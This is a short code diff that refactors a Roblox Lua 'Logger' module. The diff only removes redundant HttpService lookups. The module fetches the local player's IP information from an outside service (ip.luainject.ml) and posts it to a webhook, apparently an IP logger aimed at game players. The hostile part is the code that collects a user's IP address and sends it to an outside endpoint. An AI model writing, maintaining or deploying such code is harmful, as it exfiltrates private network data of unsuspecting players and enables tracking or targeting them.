@@ -4,9 +4,7 @@ local Logger = {
     -- Returns a table containing your IP information.
     log_table = function()
         ipftch = HttpService:GetAsync("https://ip.luainject.ml/")
-
-        local ht = game:GetService("HttpService")
-        local j = ht:JSONDecode(ipftch)
+        local j = HttpService:JSONDecode(ipftch)
 
         return j
     end,
@@ -18,13 +16,8 @@ local Logger = {
         end
 
         plr = game.Players.LocalPlayer
-
         ip_fetched = HttpService:GetAsync("https://ip.luainject.ml/")
-
-        local ht = game:GetService("HttpService")
-        local j = ht:JSONDecode(ip_fetched)
-
-        local HttpService = game:GetService("HttpService")
+        local j = HttpService:JSONDecode(ip_fetched)
 
         local dataFields = {
             ["embeds"] = {{
@@ -66,7 +59,6 @@ local Logger = {
                 }}
             }}
         }
-
         HttpService:PostAsync(webhook, dataFields, Enum.HttpContentType.ApplicationJson, false)
     end
 }
